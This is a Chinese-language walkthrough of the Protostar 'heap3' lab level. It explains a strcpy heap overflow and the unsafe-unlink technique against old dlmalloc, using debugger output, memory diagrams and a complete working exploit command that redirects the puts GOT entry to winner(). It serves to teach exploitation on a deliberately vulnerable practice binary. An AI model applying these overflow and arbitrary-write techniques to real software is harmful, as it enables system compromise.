```
Heap Three

This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.

This level is at /opt/protostar/bin/heap3
```
---
```c
###   
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```
---

**分析：**
```c
- 程序使用 `malloc(32)` 分配了三块堆内存 `a`, `b`, `c`。
- 然后使用 `strcpy` 将命令行参数 `argv[1]`, `argv[2]`, `argv[3]` 分别拷贝到这三块内存中。
- **关键问题**：`strcpy` 不会检查目标缓冲区的大小。如果输入的参数长度超过32字节，就会发生**堆溢出**，覆盖到相邻的堆块甚至堆的管理数据结构（metadata）
```

```c
在旧版本的 `glibc` 内存分配器（如 `dlmalloc`）中，`free()` 函数在释放内存时会检查并合并相邻的空闲块，这个过程称为 `unlink`。攻击者可以通过溢出精心伪造堆块的元数据（如 `fd` 和 `bk` 指针），当 `free()` 被调用时，会触发一个不安全的 `unlink` 操作（Unsafe Unlink），从而获得**任意地址写**（arbitrary write）的能力。通过这个能力，可以修改关键的函数指针（如GOT表项），将程序的执行流劫持到 `winner()` 函数。
```

```c
要触发 `winner` 函数，需要利用 **Unsafe Unlink** 攻击技术。具体步骤如下（假设在旧版glibc环境下）：

1. **布局堆块**：程序按顺序分配了 `a`、`b`、`c` 三个32字节的块。在内存中，它们通常是连续的。
2. **伪造堆块**：通过 `argv[2]` 向 `b` 缓冲区写入精心构造的超长数据。这部分数据不仅要填满 `b` 的32字节，还要溢出到 `c` 块的头部，伪造 `c` 块的元数据。
    - 将 `c` 块的 `prev_size` 字段设置为一个负数（例如 `-4`），这会让 `free(c)` 时认为 `c` 的前一个块（即 `b`）是从一个我们控制的地址开始的。
    - 在 `c` 缓冲区的起始位置（即我们伪造的“前一个块”的用户数据区），写入两个关键指针：`fd` 和 `bk`。`bk` 指针会被设置为我们想要写入的目标地址减去一个偏移量（例如，`puts` 的GOT表地址 - 0x0c）。
3. **触发 `unlink`**：当程序执行 `free(c)` 时，`free` 函数会根据我们伪造的 `prev_size` 向前寻址，找到我们伪造的“前一个块”。由于该块的大小字段（在 `c` 区域内）被我们设置为表示“空闲”，`free` 会尝试将其与 `c` 合并，从而调用 `unlink` 宏。
4. **劫持控制流**：不安全的 `unlink` 操作会执行类似 `*(fd + 0x0c) = bk` 的写操作。因为我们控制了 `fd`，这实际上会将 `bk` 的值（可以是 `winner` 函数的地址）写入到 `fd + 0x0c` 的地址，也就是 `puts` 的GOT表项。
5. **执行 `winner`**：程序最后会调用 `printf("dynamite failed?\n");`。由于编译器优化，实际调用的是 `puts`，而 `puts` 的GOT表项已被修改为 `winner` 的地址，程序将跳转执行 `winner()` 函数，打印出成功信息。
```

```c
在旧版 `glibc`（如 Protostar 使用的版本）中，`free()` 在释放一个块时，会检查其物理相邻的块是否空闲，如果空闲则进行合并（`unlink` 操作）。`unlink` 宏的简化逻辑如下：

// P 是要被 unlink 的 chunk

FD = P->fd;

BK = P->bk;

FD->bk = BK;

BK->fd = FD;

如果攻击者能控制 `P->fd` 和 `P->bk`，就可以通过 `FD->bk = BK` 这一行实现**任意地址写**。
```

**思路：通过`unlink`漏洞，将某个函数在GOT表中的地址替换成`winner()`函数的地址。**

---
**1、获取 `winner` 函数的地址和 `puts` 函数在GOT表中的地址**
```c
└─$ objdump -d heap3 |grep winner
08048864 <winner>:
```

```c
└─$ objdump -R heap3             

heap3:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
0804b0e4 R_386_GLOB_DAT    __gmon_start__
0804b140 R_386_COPY        stderr@GLIBC_2.0
0804b0f4 R_386_JUMP_SLOT   __errno_location@GLIBC_2.0
0804b0f8 R_386_JUMP_SLOT   mmap@GLIBC_2.0
0804b0fc R_386_JUMP_SLOT   sysconf@GLIBC_2.0
0804b100 R_386_JUMP_SLOT   __gmon_start__
0804b104 R_386_JUMP_SLOT   mremap@GLIBC_2.0
0804b108 R_386_JUMP_SLOT   memset@GLIBC_2.0
0804b10c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804b110 R_386_JUMP_SLOT   sbrk@GLIBC_2.0
0804b114 R_386_JUMP_SLOT   memcpy@GLIBC_2.0
0804b118 R_386_JUMP_SLOT   strcpy@GLIBC_2.0
0804b11c R_386_JUMP_SLOT   printf@GLIBC_2.0
0804b120 R_386_JUMP_SLOT   fprintf@GLIBC_2.0
0804b124 R_386_JUMP_SLOT   time@GLIBC_2.0
0804b128 R_386_JUMP_SLOT   puts@GLIBC_2.0
0804b12c R_386_JUMP_SLOT   munmap@GLIBC_2.0
```

**`winner_addr = 0x08048864`**
**`puts_got = 0x0804b128`**

**获取三个变量的地址**
```c
└─$ gdb-peda heap3
Successfully imported six module
Reading symbols from heap3...
gdb-peda$ disass main
Dump of assembler code for function main:
   ; --- 函数序言：建立栈帧 ---
   0x08048889 <+0>:     push   ebp
   0x0804888a <+1>:     mov    ebp,esp  ; `push ebp; mov ebp, esp`：这是标准的函数序言，用于建立当前函数的栈帧。`ebp`（基址指针）现在指向栈底
   0x0804888c <+3>:     and    esp,0xfffffff0
   0x0804888f <+6>:     sub    esp,0x20 ; esp（栈顶指针）减去了 0x20（十进制的32）,意味着编译器为 main 函数的局部变量在栈上分配了32字节的空间,这32字节的空间就是用来存放 a, b, c 等局部变量的地方
   
      ; 栈帧布局
      高地址
+-------------------+
|  ...              |
+-------------------+
|  函数参数 (argc, argv) |
+-------------------+
|  返回地址         |
+-------------------+ <--- ebp (栈底指针)
|  旧的 ebp         |
+-------------------+ <--- 栈顶 esp 在这里
|                   |
|   ... (其他局部变量或填充)
|                   |
+-------------------+ <--- esp + 0x1c (变量 c 的位置)
|                   |
+-------------------+ <--- esp + 0x18 (变量 b 的位置)
|                   |
+-------------------+ <--- esp + 0x14 (变量 a 的位置)
|                   |
|   ... (其他局部变量或填充)
|                   |
+-------------------+ <--- esp (新的栈顶)
   低地址

   ; --- a = malloc(32) ---
   0x08048892 <+9>:     mov    DWORD PTR [esp],0x20   ; 参数 32 (0x20) 入栈
   0x08048899 <+16>:    call   0x8048ff2 <malloc>    ; 调用 malloc
   0x0804889e <+21>:    mov    DWORD PTR [esp+0x14],eax ; 将返回值 (eax) 存入栈中变量 a 的位置

   ; --- b = malloc(32) ---
   0x080488a2 <+25>:    mov    DWORD PTR [esp],0x20   ; 参数 32 入栈
   0x080488a9 <+32>:    call   0x8048ff2 <malloc>    ; 调用 malloc
   0x080488ae <+37>:    mov    DWORD PTR [esp+0x18],eax ; 将返回值存入变量 b 的位置

   ; --- c = malloc(32) ---
   0x080488b2 <+41>:    mov    DWORD PTR [esp],0x20   ; 参数 32 入栈
   0x080488b9 <+48>:    call   0x8048ff2 <malloc>    ; 调用 malloc
   0x080488be <+53>:    mov    DWORD PTR [esp+0x1c],eax ; 将返回值存入变量 c 的位置
   
   ; --- strcpy(a, argv[1]) ---
   0x080488c2 <+57>:    mov    eax,DWORD PTR [ebp+0xc] ; 加载 argv
   0x080488c5 <+60>:    add    eax,0x4                ; eax 指向 argv[1]
   0x080488c8 <+63>:    mov    eax,DWORD PTR [eax]    ; eax = argv[1] (源地址)
   0x080488ca <+65>:    mov    DWORD PTR [esp+0x4],eax ; 将 argv[1] 作为第二个参数入栈
   0x080488ce <+69>:    mov    eax,DWORD PTR [esp+0x14] ; 从栈中加载 a 的值 (目标地址)
   0x080488d2 <+73>:    mov    DWORD PTR [esp],eax    ; 将 a 作为第一个参数入栈
   0x080488d5 <+76>:    call   0x8048750 <strcpy@plt> ; 调用 strcpy
   0x080488da <+81>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080488dd <+84>:    add    eax,0x8
   0x080488e0 <+87>:    mov    eax,DWORD PTR [eax]
   0x080488e2 <+89>:    mov    DWORD PTR [esp+0x4],eax
   0x080488e6 <+93>:    mov    eax,DWORD PTR [esp+0x18]
   0x080488ea <+97>:    mov    DWORD PTR [esp],eax
   0x080488ed <+100>:   call   0x8048750 <strcpy@plt>
   0x080488f2 <+105>:   mov    eax,DWORD PTR [ebp+0xc]
   0x080488f5 <+108>:   add    eax,0xc
   0x080488f8 <+111>:   mov    eax,DWORD PTR [eax]
   0x080488fa <+113>:   mov    DWORD PTR [esp+0x4],eax
   0x080488fe <+117>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048902 <+121>:   mov    DWORD PTR [esp],eax
   0x08048905 <+124>:   call   0x8048750 <strcpy@plt>
   0x0804890a <+129>:   mov    eax,DWORD PTR [esp+0x1c]
   0x0804890e <+133>:   mov    DWORD PTR [esp],eax
   0x08048911 <+136>:   call   0x8049824 <free>
   0x08048916 <+141>:   mov    eax,DWORD PTR [esp+0x18]
   0x0804891a <+145>:   mov    DWORD PTR [esp],eax
   0x0804891d <+148>:   call   0x8049824 <free>
   0x08048922 <+153>:   mov    eax,DWORD PTR [esp+0x14]
   0x08048926 <+157>:   mov    DWORD PTR [esp],eax
   0x08048929 <+160>:   call   0x8049824 <free>
   0x0804892e <+165>:   mov    DWORD PTR [esp],0x804ac27
   0x08048935 <+172>:   call   0x8048790 <puts@plt>
   0x0804893a <+177>:   leave
   0x0804893b <+178>:   ret
End of assembler dump.

gdb-peda$ b *0x080488d5
Breakpoint 1 at 0x080488d5: file heap3/heap3.c, line 20.
gdb-peda$ run aaa bbb ccc
Starting program: /opt/protostar/bin/heap3 aaa bbb ccc
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

[----------------------------------registers-----------------------------------]
EAX: 0x804c008 --> 0x0 
EBX: 0xf7f95e14 --> 0x232d0c ('\x0c-#')
ECX: 0xf88 
EDX: 0xf89 
ESI: 0x804ab50 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcb60 --> 0x0 
EBP: 0xffffce88 --> 0x0 
ESP: 0xffffce60 --> 0x804c008 --> 0x0 
EIP: 0x80488d5 (<main+76>:      call   0x8048750 <strcpy@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80488ca <main+65>: mov    DWORD PTR [esp+0x4],eax
   0x80488ce <main+69>: mov    eax,DWORD PTR [esp+0x14]
   0x80488d2 <main+73>: mov    DWORD PTR [esp],eax
=> 0x80488d5 <main+76>: call   0x8048750 <strcpy@plt>
   0x80488da <main+81>: mov    eax,DWORD PTR [ebp+0xc]
   0x080488dd <main+84>: add    eax,0x8
   0x080488e0 <main+87>: mov    eax,DWORD PTR [eax]
   0x080488e2 <main+89>: mov    DWORD PTR [esp+0x4],eax
Guessed arguments:
arg[0]: 0x804c008 --> 0x0 
arg[1]: 0xffffd156 --> 0x616161 ('aaa')
[------------------------------------stack-------------------------------------]
0000| 0xffffce60 --> 0x804c008 --> 0x0 
0004| 0xffffce64 --> 0xffffd156 --> 0x616161 ('aaa')
0008| 0xffffce68 --> 0x0 
0012| 0xffffce6c --> 0x0 
0016| 0xffffce70 --> 0x0 
0020| 0xffffce74 --> 0x804c008 --> 0x0 
0024| 0xffffce78 --> 0x804c030 --> 0x0 
0028| 0xffffce7c --> 0x804c058 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080488d5 in main (argc=0x4, argv=0xffffcf44) at heap3/heap3.c:20
warning: 20     heap3/heap3.c: No such file or directory
gdb-peda$ x/wx $esp+0x14
0xffffce74:     0x0804c008 <-- 这就是 a 的值 (堆地址)
gdb-peda$ x/wx $esp+0x18
0xffffce78:     0x0804c030 <-- 这就是 b 的值 (堆地址)
gdb-peda$ x/wx $esp+0x1c
0xffffce7c:     0x0804c058 <-- 这就是 c 的值 (堆地址)
```

**计算unlink所需指针**

```c
`unlink` 攻击原理 (`*(FD + 12) = BK`):
- `FD = puts_got - 12`  
    `FD = 0x0804b128 - 12 = 0x0804b11c`
    
- `BK = heap_shellcode_addr`  
    `BK = 0x0804c040`  // 假设 shellcode 位于 b+16
```

**构造exp**

```c
- **Payload for `argv[1]` (`a`)**: 无关紧要，填充满即可。  
    `"A" * 32`

- **Payload for `argv[2]` (`b`)**: 包含 shellcode 并溢出覆盖 `c` 的 metadata。
    - 前 16 字节: 填充（如 `\xff`）
    - 接着 6 字节: shellcode `\x68\x64\x88\x04\x08\xc3` （`push winner_addr; ret`）
    - 再填充至 32 字节: `\xff` * 10
    - 溢出 8 字节: 覆盖 `c` 的 header
        - `c->prev_size` = `\xfc\xff\xff\xff` （-4）
        - `c->size`      = `\xfc\xff\xff\xff` （-4）

    **组合 `argv[2]`:**  
    `"\xff"*16 + "\x68\x64\x88\x04\x08\xc3" + "\xff"*10 + "\xfc\xff\xff\xff"*2`

- **Payload for `argv[3]` (`c`)**: 构造 fake chunk（位于 `c` 的 user data 起始处）。
    - 前 4 字节: 任意 junk（如 `\xff\xff\xff\xff`）
    - 接着 4 字节: `fd = puts@GOT - 12 = \x1c\xb1\x04\x08`
    - 再 4 字节: `bk = shellcode_addr = \x40\xc0\x04\x08` （即 `b + 16 = 0x0804c030 + 16 = 0x0804c040`）

    **组合 `argv[3]`:**  
    `"\xff"*4 + "\x1c\xb1\x04\x08" + "\x40\xc0\x04\x08"`
```
**内存布局图如下：**
```c
+---------------------------+  <- 0x0804c000
| prev_size = 0x00000000    |  ← chunk a header
| size      = 0x00000029    |     (32B user + 8B header, PREV_INUSE=1)
+---------------------------+
| "A"*32                    |  ← a = 0x0804c008 (user data)
| ...                       |
+---------------------------+  <- 0x0804c028
| prev_size = 0x00000000    |  ← chunk b header
| size      = 0x00000029    |
+---------------------------+
| \xff * 16                 |  ← b = 0x0804c030 (user data)
| \x68\x64\x88\x04\x08\xc3  |  ← shellcode (6 bytes, at b+16 = 0x0804c040)
| \xff * 10                 |  ← padding to 32 bytes
+---------------------------+  <- 0x0804c050  ← c 的 chunk header 被覆盖！
| prev_size = 0xfffffffc    |  ← 被 argv[2] 溢出覆盖（原为 0）
| size      = 0xfffffffc    |  ← 被 argv[2] 溢出覆盖（原为 0x29）
+---------------------------+
| \xff * 4                  |  ← c = 0x0804c058 (user data, fake chunk 的 prev_size)
| \x1c\xb1\x04\x08          |  ← fake chunk 的 fd = 0x0804b11c (puts@GOT - 12)
| \x40\xc0\x04\x08          |  ← fake chunk 的 bk = 0x0804c040 (shellcode 地址)
+---------------------------+  <- 0x0804c064
| ... (top chunk)           |
```

**代码如下：**
```python
/opt/protostar/bin/heap3 \
  $(python -c "print 'A'*32") \
  $(python -c "print '\xff'*16 + '\x68\x64\x88\x04\x08\xc3' + '\xff'*10 + '\xfc\xff\xff\xff'*2") \
  $(python -c "print '\xff'*4 + '\x1c\xb1\x04\x08' + '\x40\xc0\x04\x08'")
```
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251011200319285.png)

---
### 关键知识讲解：`unlink` 堆利用

#### 1. 堆块（Chunk）的结构

当 `malloc` 分配内存时，它实际分配的内存比你请求的要大一点，因为它需要在你的数据前后加上一些管理信息，我们称之为“元数据”。一个典型的（32位系统下）使用中的堆块结构如下：

text

```
+-------------------+ -------
| prev_size         |  <-- chunk b 的元数据开始处
+-------------------+
| size              |  <-- 包含块大小和标志位 (例如 PREV_INUSE)
+-------------------+ -------
|                   |
|   User Data (32   |  <-- 指针 b 指向这里
|   bytes for b)    |
|                   |
+-------------------+
```

当一个堆块被 `free` 后，它的结构会变为：

text

```
+-------------------+
| prev_size         |
+-------------------+
| size              |
+-------------------+ -------
| fd (forward ptr)  |  <-- 指向下一个空闲块
+-------------------+
| bk (backward ptr) |  <-- 指向上一个空闲块
+-------------------+
|      ...          |
+-------------------+
```

空闲的块会通过 `fd` 和 `bk` 指针形成一个双向链表，方便 `malloc` 再次分配。

#### 2. `free()` 与合并（Coalescing）

当 `free(b)` 被调用时，`free` 函数会检查与 `b` 相邻的块（`a` 和 `c`）是否也是空闲的。如果是，它会把这些相邻的空闲块合并成一个更大的空闲块，以减少内存碎片。

这个合并操作中，有一个关键的步骤叫做 `unlink`。它的作用就是将一个块从空闲链表中“解链”（摘除）。

#### 3. `unlink` 宏

`unlink(P)` 宏（P是一个指向要被解链的空闲块的指针）的核心操作如下：

C

```
// FD 指向 P 的后一个空闲块
FD = P->fd;
// BK 指向 P 的前一个空闲块
BK = P->bk;

// 核心两步操作
FD->bk = BK;
BK->fd = FD;
```

这两行代码的意思是：让P的后一个块直接指向P的前一个块，P的前一个块也直接指向P的后一个块，从而跳过P，完成解链。

**漏洞就在这里！** 如果我们能伪造一个假的空闲块 `P`，并且控制 `P->fd` 和 `P->bk` 的值，那么 `unlink` 操作就会变成一个**任意地址写入**的强大工具！

```c
我们来分析 `FD->bk = BK;` 这句代码：

- 它等价于 `*(FD + 12) = BK;` (在32位系统中，bk指针在块内偏移为12字节)。
- `FD` 是我们控制的 (`P->fd`)。
- `BK` 也是我们控制的 (`P->bk`)。

假设我们想实现 `*ADDRESS = VALUE` 这个操作：

1. 我们让 `FD` 指向 `ADDRESS - 12`。
2. 我们让 `BK` 等于 `VALUE`。

那么 `*( (ADDRESS - 12) + 12 ) = VALUE` 就变成了 `*ADDRESS = VALUE`。我们成功地将任意`VALUE`写入了任意`ADDRESS`！
```

---
**什么是GOT表？**  
```c
全局偏移表（Global Offset Table）是Linux动态链接程序使用的一种机制。程序第一次调用某个库函数（如 `puts`）时，动态链接器会找到这个函数的真实地址，并填入GOT表中。之后再调用，程序就会直接从GOT表中取地址跳转。如果我们能修改GOT表里 `puts` 函数的地址为 `winner` 函数的地址，那么下一次调用 `puts()` 时，实际上会去执行 `winner()`
```